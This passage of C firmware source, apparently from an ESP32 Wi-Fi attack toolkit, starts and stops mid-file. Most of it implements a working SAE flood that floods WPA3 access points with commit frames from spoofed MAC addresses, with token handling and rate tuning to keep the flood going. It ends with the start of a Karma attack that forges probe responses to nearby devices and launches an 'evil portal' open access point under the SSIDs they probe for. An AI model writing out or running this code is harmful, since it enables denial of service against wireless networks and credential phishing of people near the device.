        if (mbedtls_ecp_group_load(&sae_ctx.group, MBEDTLS_ECP_DP_SECP256R1) != 0) {
            mbedtls_ecp_group_free(&sae_ctx.group);
            return ESP_FAIL;
        }
        sae_initialized = true;
    }

    // Use cached commit for this MAC if available
    int pool_idx = -1;
    if (sae_mac_pool_ready) {
        for (int i = 0; i < SAE_MAC_POOL_SIZE; ++i) {
            if (memcmp(sae_mac_pool[i], src_mac, 6) == 0) { pool_idx = i; break; }
        }
    }
    bool used_cache = false;
    if (pool_idx >= 0 && pwd && strlen(pwd) > 0 && sae_commit_cache_ready[pool_idx]) {
        portENTER_CRITICAL(&sae_lock);
        memcpy(sae_ctx.own_mac, src_mac, 6);
        memcpy(sae_ctx.peer_mac, sae_target_bssid, 6);
        memcpy(sae_ctx.bssid, sae_target_bssid, 6);
        mbedtls_mpi_read_binary(&sae_ctx.own_scalar, sae_commit_scalar_cache[pool_idx], 32);
        portEXIT_CRITICAL(&sae_lock);
        if ((size_t)frame_len + 32 + 32 > sizeof(sae_frame_buffer)) {
            return ESP_ERR_NO_MEM;
        }
        memcpy(sae_frame_buffer + frame_len, sae_commit_scalar_cache[pool_idx], 32);
        frame_len += 32;
        memcpy(sae_frame_buffer + frame_len, sae_commit_element_cache[pool_idx] + 1, 32);
        frame_len += 32;
        used_cache = true;
        sae_cache_hits++;
        ESP_LOGI("SAE_TX", "cache hit idx=%d", pool_idx);
    } else {
        // Fall back to on-demand derivation/generation when no cache; require password/PWE
        if (!(pwd && strlen(pwd) > 0)) return ESP_FAIL;
        if (sae_init_context(pwd, src_mac, sae_target_bssid, ssid) != ESP_OK ||
            sae_generate_commit(&sae_ctx) != ESP_OK) {
            mbedtls_ecp_group_free(&sae_ctx.group);
            mbedtls_ecp_point_free(&sae_ctx.pwe);
            mbedtls_ecp_point_free(&sae_ctx.peer_element);
            mbedtls_ecp_point_free(&sae_ctx.own_element);
            mbedtls_mpi_free(&sae_ctx.peer_scalar);
            mbedtls_mpi_free(&sae_ctx.own_scalar);
            mbedtls_mpi_free(&sae_ctx.rand);
            mbedtls_mpi_free(&sae_ctx.mask);
            memset(&sae_ctx, 0, sizeof(sae_ctx));
            sae_initialized = false;
                return ESP_FAIL;
            }
        sae_cache_misses++;
        ESP_LOGI("SAE_TX", "cache miss derive ok");
    }
    
    if (!used_cache) {
        // Element: 32-byte X coordinate of own_element
        uint8_t element_x[32];
        size_t elen = 0;
        uint8_t element_buf[33];
        if (mbedtls_ecp_point_write_binary(&sae_ctx.group, &sae_ctx.own_element,
                                           MBEDTLS_ECP_PF_COMPRESSED, &elen,
                                           element_buf, sizeof(element_buf)) != 0 || elen < 33) {
            return ESP_FAIL;
        }
        memcpy(element_x, element_buf + 1, 32);
        if ((size_t)frame_len + 32 + 32 > sizeof(sae_frame_buffer)) {
            return ESP_ERR_NO_MEM;
        }
        // Scalar (32 bytes)
        mbedtls_mpi_write_binary(&sae_ctx.own_scalar, sae_frame_buffer + frame_len, 32);
        frame_len += 32;
        memcpy(sae_frame_buffer + frame_len, element_x, 32);
        frame_len += 32;
    }
    ESP_LOGI("SAE_TX", "frm len=%d", frame_len);

    // Append anti-clogging token (after scalar + element)
    if (token_required_local && token_len_local > 0) {
        size_t remaining = sizeof(sae_frame_buffer) - frame_len;
        if ((size_t)token_len_local > remaining) token_len_local = (uint16_t)remaining;
        if (token_len_local > 0) {
            memcpy(sae_frame_buffer + frame_len, token_buf_local, token_len_local);
            frame_len += token_len_local;
        }
    }
    
    // Transmit commit frame
    // Maintain a per-MAC seq counter to keep auth seq control more stable
    if (pool_idx >= 0) {
        uint16_t s = ++sae_seq_counters[pool_idx] & 0x0FFF;
        sae_frame_buffer[22] = (s << 4) & 0xF0;
        sae_frame_buffer[23] = (s >> 4) & 0xFF;
    }
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, sae_frame_buffer, frame_len, false);
    if (err == ESP_OK) {
        sae_flood_packets_sent++;
        sae_commit_tx_ok++;
        ESP_LOGI("SAE_TX", "tx ok");
    } else {
        ESP_LOGE("SAE_FLOOD", "SAE commit injection failed: %s", esp_err_to_name(err));
        sae_commit_tx_err++;
    }
    return err;
}
static void sae_flood_task(void *param) {
    uint8_t spoofed_mac[6];
    uint8_t base_mac[6];
    int frame_counter = 0;
    int backoff_ms = 0;
    int consecutive_no_mem = 0;
    int rate_scale_pct = 100;
    int success_streak = 0;
    
    // Get base MAC address
    esp_wifi_get_mac(WIFI_IF_STA, base_mac);
    
    printf("SAE flood started on ch %d\n", sae_target_channel);
    printf("Target: %02x:%02x:%02x:%02x:%02x:%02x\n", 
           sae_target_bssid[0], sae_target_bssid[1], sae_target_bssid[2],
           sae_target_bssid[3], sae_target_bssid[4], sae_target_bssid[5]);
    printf("Rate: %d fps\n", sae_injection_rate);
    
    while (sae_flood_running) {
        if ((frame_counter % 100) == 0) {
            ESP_LOGI("SAE_LOOP", "alive fc=%d sent=%d", frame_counter, sae_flood_packets_sent);
        }
        // Select spoofed MAC, pin to token MAC if anti-clogging token is active
        if (sae_token_mac_valid) {
            memcpy(spoofed_mac, sae_token_mac, 6);
        } else if (sae_mac_pool_ready) {
            int pool_idx = (frame_counter / (sae_frames_per_mac > 0 ? sae_frames_per_mac : 1)) % SAE_MAC_POOL_SIZE;
            memcpy(spoofed_mac, sae_mac_pool[pool_idx], 6);
        } else {
            // Fallback to legacy derivation if pool not ready
            memcpy(spoofed_mac, base_mac, 6);
            spoofed_mac[4] = (frame_counter >> 8) & 0xFF;
            spoofed_mac[5] = frame_counter & 0xFF;
            // Ensure locally administered, unicast
            spoofed_mac[0] |= 0x02;
            spoofed_mac[0] &= 0xFE;
        }
        
        // Inject SAE commit frame
        esp_err_t tx_res = inject_sae_commit_frame(spoofed_mac, frame_counter);
        if (tx_res == ESP_ERR_NO_MEM) {
            consecutive_no_mem++;
            success_streak = 0;
            backoff_ms = (backoff_ms == 0) ? 50 : (backoff_ms * 2);
            if (backoff_ms > 1000) backoff_ms = 1000;
            if (rate_scale_pct > 10) {
                rate_scale_pct -= 20;
                if (rate_scale_pct < 10) rate_scale_pct = 10;
            }
            ESP_LOGW("SAE_FLOOD", "ESP_ERR_NO_MEM, backing off %d ms (streak=%d)", backoff_ms, consecutive_no_mem);
            vTaskDelay(pdMS_TO_TICKS(backoff_ms));
        } else if (tx_res != ESP_OK) {
            // brief pause on other errors to avoid tight loop
            vTaskDelay(pdMS_TO_TICKS(20));
        } else {
            if (backoff_ms > 0) backoff_ms /= 2;
            if (consecutive_no_mem) consecutive_no_mem = 0;
            if (++success_streak >= 10) {
                success_streak = 0;
                if (rate_scale_pct < 100) {
                    rate_scale_pct += 10;
                    if (rate_scale_pct > 100) rate_scale_pct = 100;
                }
            }
        }
        
        frame_counter = (frame_counter + 1) % 65536;
        
        // Rate limiting with variation and adaptive scaling
        int base_rate = (sae_injection_rate * rate_scale_pct) / 100;
        int variation = (esp_random() % 20) - 10; // +/- 10%
        int actual_rate = base_rate + (base_rate * variation / 100);
        if (actual_rate < 1) actual_rate = 1;
        if (actual_rate > 200) actual_rate = 200;
        
        // Ensure minimum delay to prevent watchdog timeout
        int delay_ms = 1000 / actual_rate;
    if (delay_ms < 2) delay_ms = 2; // harder push
        if (backoff_ms > delay_ms) delay_ms = backoff_ms;
        vTaskDelay(pdMS_TO_TICKS(delay_ms));
        
        // Yield to other tasks every 10 frames
        if ((frame_counter % 10) == 0) {
            taskYIELD();
        }
    }
    
    printf("SAE flood stopped. Sent: %d\n", sae_flood_packets_sent);
    sae_flood_task_handle = NULL;
    vTaskDelete(NULL);
}

static void sae_flood_display_task(void *param) {
    int last_count = 0;
    
    while (sae_flood_running) {
        int frames_in_period = sae_flood_packets_sent - last_count;
        int current_rate = frames_in_period / 5;
        last_count = sae_flood_packets_sent;
        
        // Use simpler output to reduce stack usage
        printf("SAE: %d/sec | %d total | hits:%u miss:%u pwefail:%u tok:%u txok:%u txerr:%u s76:%u s0:%u\n",
               current_rate, sae_flood_packets_sent,
               (unsigned)sae_cache_hits, (unsigned)sae_cache_misses,
               (unsigned)sae_pwe_failures, (unsigned)sae_token_rx,
               (unsigned)sae_commit_tx_ok, (unsigned)sae_commit_tx_err,
               (unsigned)sae_status76_rx, (unsigned)sae_status0_rx);
        
        vTaskDelay(pdMS_TO_TICKS(5000));
    }
    
    sae_flood_display_task_handle = NULL;
    vTaskDelete(NULL);
}

static void sanitize_password_input(const char *in, char *out, size_t out_size) {
    if (!out || out_size == 0) return;
    if (!in) { out[0] = '\0'; return; }
    while (*in && isspace((unsigned char)*in)) in++;
    const char *end = in + strlen(in);
    while (end > in && isspace((unsigned char)end[-1])) end--;
    if (end > in + 1 && (in[0] == '"' || in[0] == '\'')) {
        char q = in[0];
        if (end[-1] == q) { in++; end--; }
    }
    size_t n = (size_t)(end - in);
    if (n >= out_size) n = out_size - 1;
    if (n > 0) memcpy(out, in, n);
    out[n] = '\0';
}

void wifi_manager_start_sae_flood(const char *password) {
#if !defined(CONFIG_IDF_TARGET_ESP32C5) && !defined(CONFIG_IDF_TARGET_ESP32C6)
    printf("SAE flood attack only supported on ESP32-C5 and ESP32-C6\n");
    TERMINAL_VIEW_ADD_TEXT("SAE flood attack only supported on ESP32-C5 and ESP32-C6\n");
    return;
#endif

    if (sae_flood_running) {
        printf("SAE flood attack already running\n");
        TERMINAL_VIEW_ADD_TEXT("SAE flood attack already running\n");
        return;
    }

    if (ap_count == 0 || scanned_aps == NULL) {
        printf("No AP selected. Use 'select -a <index>' first\n");
        TERMINAL_VIEW_ADD_TEXT("No AP selected. Use 'select -a <index>' first\n");
        return;
    }
    
    bool supports_wpa3 = false;
    if (selected_ap.authmode == WIFI_AUTH_WPA3_PSK || 
        selected_ap.authmode == WIFI_AUTH_WPA2_WPA3_PSK
#if defined(CONFIG_IDF_TARGET_ESP32C5) || defined(CONFIG_IDF_TARGET_ESP32C6)
        || selected_ap.authmode == WIFI_AUTH_WPA3_ENTERPRISE
#endif
        ) {
        supports_wpa3 = true;
    }

    if (!supports_wpa3) {
        printf("Selected AP does not support WPA3/SAE authentication\n");
        TERMINAL_VIEW_ADD_TEXT("Selected AP does not support WPA3/SAE authentication\n");
        printf("AP Auth Mode: %d (WPA3 required)\n", selected_ap.authmode);
        TERMINAL_VIEW_ADD_TEXT("AP Auth Mode: %d (WPA3 required)\n", selected_ap.authmode);
        return;
    }

    memcpy(sae_target_bssid, selected_ap.bssid, 6);
    sae_target_channel = selected_ap.primary;
    sae_injection_rate = 60;
    sae_flood_packets_sent = 0;
    sae_flood_running = true;
    sae_initialized = false;
    sanitize_password_input(password, sae_flood_password_buf, sizeof(sae_flood_password_buf));
    portENTER_CRITICAL(&sae_lock);
    sae_ctx.token_required = false;
    sae_ctx.token_len = 0;
    portEXIT_CRITICAL(&sae_lock);

    // Build a small pool of spoofed MACs to preserve randomness without exhausting heap
    {
        uint8_t base_mac_build[6];
        esp_wifi_get_mac(WIFI_IF_STA, base_mac_build);
        for (int i = 0; i < SAE_MAC_POOL_SIZE; ++i) {
            uint32_t r = esp_random();
            memcpy(sae_mac_pool[i], base_mac_build, 6);
            // locally administered, unicast
            sae_mac_pool[i][0] |= 0x02;
            sae_mac_pool[i][0] &= 0xFE;
            sae_mac_pool[i][4] = (r >> 8) & 0xFF;
            sae_mac_pool[i][5] = r & 0xFF;
            sae_seq_counters[i] = (uint16_t)(esp_random() & 0x0FFF);
            sae_precompute_attempted[i] = false;
            sae_commit_cache_ready[i] = false;
        }
        sae_mac_pool_ready = true;
    }

    // Precompute commit (element + scalar) per MAC to avoid per-frame allocations
    memset(sae_commit_cache_ready, 0, sizeof(sae_commit_cache_ready));
    const char *pwd = sae_flood_password_buf[0] ? sae_flood_password_buf : NULL;
    const char *ssid = (selected_ap.ssid[0] != '\0') ? (char*)selected_ap.ssid : NULL;
    if (pwd && strlen(pwd) > 0) {
        if (!sae_crypto_initialized) {
            mbedtls_entropy_init(&sae_entropy);
            mbedtls_ctr_drbg_init(&sae_ctr_drbg);
            mbedtls_ecp_point_init(&sae_tmp_point);
            mbedtls_ctr_drbg_seed(&sae_ctr_drbg, mbedtls_entropy_func, &sae_entropy, NULL, 0);
            sae_crypto_initialized = true;
        }
        if (!sae_initialized) {
            mbedtls_ecp_group_init(&sae_ctx.group);
            mbedtls_ecp_point_init(&sae_ctx.pwe);
            mbedtls_ecp_point_init(&sae_ctx.own_element);
            mbedtls_ecp_point_init(&sae_ctx.peer_element);
            mbedtls_mpi_init(&sae_ctx.own_scalar);
            mbedtls_mpi_init(&sae_ctx.peer_scalar);
            mbedtls_mpi_init(&sae_ctx.rand);
            mbedtls_mpi_init(&sae_ctx.mask);
            if (mbedtls_ecp_group_load(&sae_ctx.group, MBEDTLS_ECP_DP_SECP256R1) != 0) {
                // Skip precompute on error
            } else {
                int precomputed = 0;
                for (int i = 0; i < SAE_MAC_POOL_SIZE && precomputed < SAE_PRECOMPUTE_LIMIT; ++i) {
                    if (sae_precompute_attempted[i]) continue;
                    sae_precompute_attempted[i] = true;
                if (sae_derive_pwe(pwd, sae_mac_pool[i], sae_target_bssid, ssid, &sae_ctx.pwe, &sae_ctx.group) == ESP_OK) {
                        if (sae_generate_commit(&sae_ctx) == ESP_OK) {
                            uint8_t element_buf[33];
                            size_t elen = 0;
                            if (mbedtls_ecp_point_write_binary(&sae_ctx.group, &sae_ctx.own_element,
                                                               MBEDTLS_ECP_PF_COMPRESSED, &elen,
                                                               element_buf, sizeof(element_buf)) == 0 && elen == 33) {
                                memcpy(sae_commit_element_cache[i], element_buf, 33);
                                mbedtls_mpi_write_binary(&sae_ctx.own_scalar, sae_commit_scalar_cache[i], 32);
                                sae_commit_cache_ready[i] = true;
                                precomputed++;
                            }
                        }
                    } else {
                        sae_pwe_failures++;
                    }
                }
            }
            sae_initialized = true;
        }
    }

    wifi_manager_start_monitor_mode(sae_monitor_callback);
    esp_wifi_set_channel(sae_target_channel, WIFI_SECOND_CHAN_NONE);

    xTaskCreate(sae_flood_task, "sae_flood_task", 3072, NULL, 5, &sae_flood_task_handle);
    xTaskCreate(sae_flood_display_task, "sae_displ", 2048, NULL, 3, &sae_flood_display_task_handle);

    char bssid_str[18];
    snprintf(bssid_str, sizeof(bssid_str), "%02x:%02x:%02x:%02x:%02x:%02x",
             sae_target_bssid[0], sae_target_bssid[1], sae_target_bssid[2],
             sae_target_bssid[3], sae_target_bssid[4], sae_target_bssid[5]);

    printf("SAE flood attack started against %s (%s) on channel %d\n", 
           selected_ap.ssid, bssid_str, sae_target_channel);
    TERMINAL_VIEW_ADD_TEXT("SAE flood attack started against %s (%s) on channel %d\n", 
                          selected_ap.ssid, bssid_str, sae_target_channel);
#ifdef CONFIG_WITH_STATUS_DISPLAY
    status_display_show_attack("SAE flood", "running");
#endif
}

void wifi_manager_stop_sae_flood(void) {
    if (!sae_flood_running) {
        printf("SAE flood attack not running\n");
        TERMINAL_VIEW_ADD_TEXT("SAE flood attack not running\n");
        return;
    }
    
    sae_flood_running = false;
    
    // Wait for tasks to finish
    if (sae_flood_task_handle) {
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    if (sae_flood_display_task_handle) {
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    
    wifi_manager_stop_monitor_mode();
    if (sae_initialized) {
        mbedtls_ecp_group_free(&sae_ctx.group);
        mbedtls_ecp_point_free(&sae_ctx.pwe);
        mbedtls_ecp_point_free(&sae_ctx.peer_element);
        mbedtls_ecp_point_free(&sae_ctx.own_element);
        mbedtls_mpi_free(&sae_ctx.peer_scalar);
        mbedtls_mpi_free(&sae_ctx.own_scalar);
        mbedtls_mpi_free(&sae_ctx.rand);
        mbedtls_mpi_free(&sae_ctx.mask);
        memset(&sae_ctx, 0, sizeof(sae_ctx));
        sae_initialized = false;
    }
    if (sae_crypto_initialized) {
        mbedtls_ecp_point_free(&sae_tmp_point);
        mbedtls_ctr_drbg_free(&sae_ctr_drbg);
        mbedtls_entropy_free(&sae_entropy);
        sae_crypto_initialized = false;
    }
    memset(sae_commit_cache_ready, 0, sizeof(sae_commit_cache_ready));
    sae_mac_pool_ready = false;
    printf("SAE flood attack stopped. Total frames sent: %d\n", sae_flood_packets_sent);
    TERMINAL_VIEW_ADD_TEXT("SAE flood attack stopped. Total frames sent: %d\n", sae_flood_packets_sent);
#ifdef CONFIG_WITH_STATUS_DISPLAY
    status_display_show_status("SAE stopped");
#endif
}

void wifi_manager_set_html_from_uart(void) {
    use_html_buffer = true;
    if (html_buffer == NULL) {
        html_buffer = (char*)malloc(MAX_HTML_BUFFER_SIZE);
        if (html_buffer == NULL) {
            printf("Failed to allocate HTML buffer\n");
            use_html_buffer = false;
            log_heap_status(TAG, "html_buffer_alloc_fail");
            return;
        }
        log_heap_status(TAG, "html_buffer_alloc_ok");
    }
    html_buffer_size = 0;
    printf("HTML buffer mode enabled, ready to receive HTML content\n");
}

void wifi_manager_store_html_chunk(const char* data, size_t len, bool is_final) {
    if (!use_html_buffer || html_buffer == NULL) {
        return;
    }
    
    if (html_buffer_size + len >= MAX_HTML_BUFFER_SIZE) {
        printf("HTML buffer overflow, truncating content\n");
        len = MAX_HTML_BUFFER_SIZE - html_buffer_size - 1;
    }
    
    if (len > 0) {
        memcpy(html_buffer + html_buffer_size, data, len);
        html_buffer_size += len;
    }
    
    if (is_final) {
        html_buffer[html_buffer_size] = '\0';
        printf("HTML content stored in buffer (%zu bytes)\n", html_buffer_size);
        ESP_LOGI(TAG, "HTML capture completed: buffer=%p, size=%zu, use_html_buffer=%s", 
                 html_buffer, html_buffer_size, use_html_buffer ? "true" : "false");
    }
}

void wifi_manager_clear_html_buffer(void) {
    ESP_LOGI(TAG, "Clearing HTML buffer - current state: buffer=%p, size=%zu, use_html_buffer=%s", 
             html_buffer, html_buffer_size, use_html_buffer ? "true" : "false");
    
    use_html_buffer = false;
    if (html_buffer != NULL) {
        free(html_buffer);
        html_buffer = NULL;
    }
    html_buffer_size = 0;
    printf("HTML buffer cleared and disabled\n");
    ESP_LOGI(TAG, "HTML buffer cleared successfully");
}

void wifi_manager_sae_flood_help(void) {
    glog("SAE Flood Attack - Overwhelms WPA3 APs with commit frames\n");
    glog("Rate: 100+ frames/sec with randomization\n");
    glog("Requirements: ESP32-C5/C6, WPA3 AP selected\n");
    glog("Usage: scanap -> list -a -> select -a <index> -> saeflood\n");
    glog("Commands: saeflood, stopsaeflood, saefloodhelp\n");
}
/**
 * SAE monitoring callback to handle commit/confirm responses and anti-clogging tokens
 */
static void sae_monitor_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT) return;
    
    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)pkt->payload;
    wifi_ieee80211_mac_hdr_t hdr_copy;
    memcpy(&hdr_copy, &ipkt->hdr, sizeof(wifi_ieee80211_mac_hdr_t));  // Copy to avoid unaligned pointer
    const wifi_ieee80211_mac_hdr_t *hdr = &hdr_copy;
    
    // Check if it's an authentication frame from our target AP
    if ((hdr->frame_ctrl & 0xFC) != 0xB0) return;  // Not auth frame
    if (memcmp(hdr->addr2, sae_target_bssid, 6) != 0) return;  // Not from target AP
    
    const uint8_t *auth_body = ipkt->payload;
    uint16_t auth_alg = auth_body[0] | (auth_body[1] << 8);
    uint16_t auth_seq = auth_body[2] | (auth_body[3] << 8);
    uint16_t status_code = auth_body[4] | (auth_body[5] << 8);
    
    if (auth_alg != 3) return;  // Not SAE
    
    if (auth_seq == 1) {  // SAE Commit response
        if (status_code == 76) {  // Anti-clogging token required
            ESP_LOGI("SAE_RX", "status 76 token required");
            uint16_t group_id = auth_body[6] | (auth_body[7] << 8);
            // payload length is total mgmt payload minus 24 byte MAC header
            size_t payload_len = (pkt->rx_ctrl.sig_len > 24) ? (size_t)pkt->rx_ctrl.sig_len - 24 : 0;
            // Authentication body starts at payload+24
            const uint8_t *auth_payload = (const uint8_t*)ipkt; // ipkt->payload already points past header in struct
            const uint8_t *ptr = auth_body + 8;
            size_t remaining = (payload_len > 8) ? (payload_len - 8) : 0;
            uint16_t tlen = 0;
            if (group_id == 19 && remaining >= 2) {
                // For our simplified format, treat everything after group as token up to our cap
                tlen = (remaining > sizeof(sae_ctx.token)) ? sizeof(sae_ctx.token) : (uint16_t)remaining;
            }
            portENTER_CRITICAL(&sae_lock);
            sae_ctx.token_required = (tlen > 0);
            sae_ctx.token_len = tlen;
            if (tlen) memcpy(sae_ctx.token, ptr, tlen);
            portEXIT_CRITICAL(&sae_lock);
            memcpy(sae_token_mac, hdr->addr1, 6);
            sae_token_mac_valid = true;
            sae_token_rx++;
            sae_status76_rx++;
        } else if (status_code == 0) {  // Success - extract peer commit
            ESP_LOGI("SAE_RX", "status 0 commit accepted");
            // Extract peer scalar and element from response
            uint16_t group_id = auth_body[6] | (auth_body[7] << 8);
            if (group_id == 19) {  // P-256
                // Peer scalar (32 bytes) + element (32 bytes)
                mbedtls_mpi_read_binary(&sae_ctx.peer_scalar, auth_body + 8, 32);
                uint8_t peer_element_buf[33] = {0x02};  // Compressed format
                memcpy(peer_element_buf + 1, auth_body + 40, 32);
                mbedtls_ecp_point_read_binary(&sae_ctx.group, &sae_ctx.peer_element, 
                                              peer_element_buf, 33);
                // Match scalar and element to the MAC AP responded to; set full tuple
                if (sae_mac_pool_ready) {
                    for (int i = 0; i < SAE_MAC_POOL_SIZE; ++i) {
                        if (sae_commit_cache_ready[i] && memcmp(hdr->addr1, sae_mac_pool[i], 6) == 0) {
                            portENTER_CRITICAL(&sae_lock);
                            memcpy(sae_ctx.own_mac, sae_mac_pool[i], 6);
                            memcpy(sae_ctx.peer_mac, sae_target_bssid, 6);
                            memcpy(sae_ctx.bssid, sae_target_bssid, 6);
                            mbedtls_mpi_read_binary(&sae_ctx.own_scalar, sae_commit_scalar_cache[i], 32);
                            portEXIT_CRITICAL(&sae_lock);
                            ESP_LOGI("SAE_RX", "matched pool idx=%d", i);
                            break;
                        }
                    }
                }

                // Ensure PWE is derived for this MAC tuple for confirm/KCK
                const char *pwd = settings_get_sta_password(&G_Settings);
                const char *ssid = (selected_ap.ssid[0] != '\0') ? (char*)selected_ap.ssid : NULL;
                if (pwd && strlen(pwd) > 0) {
                    ESP_LOGI("SAE_RX", "derive pwe for confirm path");
                    sae_derive_pwe(pwd, sae_ctx.own_mac, sae_target_bssid, ssid, &sae_ctx.pwe, &sae_ctx.group);
                }
                
                // do not send confirm; continue flooding commits only
                sae_status0_rx++;
                // Clear token state after a successful exchange
                portENTER_CRITICAL(&sae_lock);
                sae_ctx.token_required = false;
                sae_ctx.token_len = 0;
                portEXIT_CRITICAL(&sae_lock);
                sae_token_mac_valid = false;
            }
        }
    } else if (auth_seq == 2) {  // SAE Confirm response
        ESP_LOGI("SAE_RX", "confirm status=%u", (unsigned)status_code);
    }
}
/**
 * Inject SAE confirm frame after successful commit exchange
 */
static bool karma_running = false;
static TaskHandle_t karma_task_handle = NULL;

// Add these globals near your other Karma variables
static char karma_ssid_cache[KARMA_MAX_SSIDS][33];
static int karma_ssid_count = 0;
static int karma_ssid_index = 0;
static uint32_t last_ssid_change_time = 0;
static bool karma_ssid_manual_mode = false;


// Helper to add SSID to cache if not present
static void karma_add_ssid(const char *ssid) {
    if (ssid == NULL || strlen(ssid) == 0) return;
    // Check for duplicate
    for (int i = 0; i < karma_ssid_count; ++i) {
        if (strcmp(karma_ssid_cache[i], ssid) == 0) return;
    }
    // Add if space
    if (karma_ssid_count < KARMA_MAX_SSIDS) {
        strncpy(karma_ssid_cache[karma_ssid_count], ssid, 32);
        karma_ssid_cache[karma_ssid_count][32] = '\0';
        karma_ssid_count++;
        printf("Karma cached SSID: %s\n", ssid);
        TERMINAL_VIEW_ADD_TEXT("Karma cached SSID: %s\n", ssid);
    }
}

void wifi_manager_set_karma_ssid_list(const char **ssids, int count) {
    if (count > KARMA_MAX_SSIDS) count = KARMA_MAX_SSIDS;
    karma_ssid_count = 0;
    for (int i = 0; i < count; ++i) {
        if (ssids[i] && strlen(ssids[i]) > 0 && strlen(ssids[i]) < 33) {
            strncpy(karma_ssid_cache[karma_ssid_count], ssids[i], 32);
            karma_ssid_cache[karma_ssid_count][32] = '\0';
            karma_ssid_count++;
        }
    }
    karma_ssid_index = 0;
    karma_ssid_manual_mode = true;
}

// Helper function to send a probe response to a station
static void karma_send_probe_response(const uint8_t *sta_mac, const char *ssid) {
    uint8_t resp[128] = {0};
    int idx = 0;
    // Frame Control: Probe Response (0x50 0x00)
    resp[idx++] = 0x50; resp[idx++] = 0x00;
    // Duration
    resp[idx++] = 0x00; resp[idx++] = 0x00;
    // Destination: station MAC
    memcpy(&resp[idx], sta_mac, 6); idx += 6;
    // Source: our AP MAC
    uint8_t ap_mac[6];
    esp_wifi_get_mac(WIFI_IF_AP, ap_mac);
    memcpy(&resp[idx], ap_mac, 6); idx += 6;
    // BSSID: our AP MAC
    memcpy(&resp[idx], ap_mac, 6); idx += 6;
    // Seq-ctl
    resp[idx++] = 0x00; resp[idx++] = 0x00;
    // Timestamp (8 bytes)
    memset(&resp[idx], 0, 8); idx += 8;
    // Beacon interval
    resp[idx++] = 0x64; resp[idx++] = 0x00;
    // Capability info
    resp[idx++] = 0x11; resp[idx++] = 0x04;
    // SSID IE
    resp[idx++] = 0x00; // Tag
    resp[idx++] = strlen(ssid); // Length
    memcpy(&resp[idx], ssid, strlen(ssid)); idx += strlen(ssid);
    // Supported rates IE
    resp[idx++] = 0x01; resp[idx++] = 0x08;
    resp[idx++] = 0x82; resp[idx++] = 0x84; resp[idx++] = 0x8B; resp[idx++] = 0x96;
    resp[idx++] = 0x24; resp[idx++] = 0x30; resp[idx++] = 0x48; resp[idx++] = 0x6C;
    // DS Parameter Set IE (channel)
    resp[idx++] = 0x03; resp[idx++] = 0x01;
    uint8_t channel = 1;
    wifi_second_chan_t second;
    esp_wifi_get_channel(&channel, &second);
    resp[idx++] = channel;

    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, resp, idx, false);

    // --- VERBOSE LOGGING FOR KARMA INTERACTIONS ---
    if (err == ESP_OK) {
        printf("[KARMA] Sent probe response to STA %02X:%02X:%02X:%02X:%02X:%02X for SSID '%s'\n",
            sta_mac[0], sta_mac[1], sta_mac[2], sta_mac[3], sta_mac[4], sta_mac[5], ssid);
        TERMINAL_VIEW_ADD_TEXT("[KARMA] Sent probe response to STA %02X:%02X:%02X:%02X:%02X:%02X for SSID '%s'\n",
            sta_mac[0], sta_mac[1], sta_mac[2], sta_mac[3], sta_mac[4], sta_mac[5], ssid);
    } else {
        printf("[KARMA] Failed to send probe response to STA %02X:%02X:%02X:%02X:%02X:%02X for SSID '%s': %s\n",
            sta_mac[0], sta_mac[1], sta_mac[2], sta_mac[3], sta_mac[4], sta_mac[5], ssid, esp_err_to_name(err));
        TERMINAL_VIEW_ADD_TEXT("[KARMA] Failed to send probe response to STA %02X:%02X:%02X:%02X:%02X:%02X for SSID '%s': %s\n",
            sta_mac[0], sta_mac[1], sta_mac[2], sta_mac[3], sta_mac[4], sta_mac[5], ssid, esp_err_to_name(err));
    }
}

static void karma_probe_request_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT) return;
    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)pkt->payload;
    const wifi_ieee80211_hdr_t *hdr = &ipkt->hdr;
    uint8_t subtype = (hdr->frame_ctrl & 0xF0) >> 4;
    if (subtype != 4) return;
    const uint8_t *payload = ipkt->payload;
    int ssid_offset = 0;
    while (ssid_offset < pkt->rx_ctrl.sig_len - 24) {
        if (payload[ssid_offset] == 0x00) { // SSID IE
            uint8_t ssid_len = payload[ssid_offset + 1];
            if (ssid_len > 0 && ssid_len < 33) {
                char probed_ssid[33] = {0};
                memcpy(probed_ssid, &payload[ssid_offset + 2], ssid_len);
                if (!karma_ssid_manual_mode) {
                    karma_add_ssid(probed_ssid);
                }
                printf("[KARMA] Received probe request from STA %02X:%02X:%02X:%02X:%02X:%02X for SSID '%s'\n",
                    hdr->addr2[0], hdr->addr2[1], hdr->addr2[2], hdr->addr2[3], hdr->addr2[4], hdr->addr2[5], probed_ssid);
                TERMINAL_VIEW_ADD_TEXT("[KARMA] Received probe request from STA %02X:%02X:%02X:%02X:%02X:%02X for SSID '%s'\n",
                    hdr->addr2[0], hdr->addr2[1], hdr->addr2[2], hdr->addr2[3], hdr->addr2[4], hdr->addr2[5], probed_ssid);
                // Respond directly to probe request
                karma_send_probe_response(hdr->addr2, probed_ssid);
            }
            break;
        }
        ssid_offset += payload[ssid_offset + 1] + 2;
    }
}

static void karma_start_portal_for_ssid(const char *ssid) {
    // Use the default portal, SSID as AP name, open AP (no password)
    if (!karma_portal_active) {
        wifi_manager_start_evil_portal("default", ssid, "", ssid, "portal.local");
        karma_portal_active = true;
        printf("[KARMA] Evil portal started for SSID: %s\n", ssid);
        TERMINAL_VIEW_ADD_TEXT("[KARMA] Evil portal started for SSID: %s\n", ssid);
    }
}

static void karma_stop_portal_if_active(void) {
    if (karma_portal_active) {
        wifi_manager_stop_evil_portal();
        karma_portal_active = false;
        printf("[KARMA] Evil portal stopped\n");
        TERMINAL_VIEW_ADD_TEXT("[KARMA] Evil portal stopped\n");
    }
}

static void karma_task(void *param) {
    printf("Karma attack started\n");
    TERMINAL_VIEW_ADD_TEXT("Karma attack started\n");
    wifi_promiscuous_filter_t filter = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT };
    esp_wifi_set_promiscuous_filter(&filter);
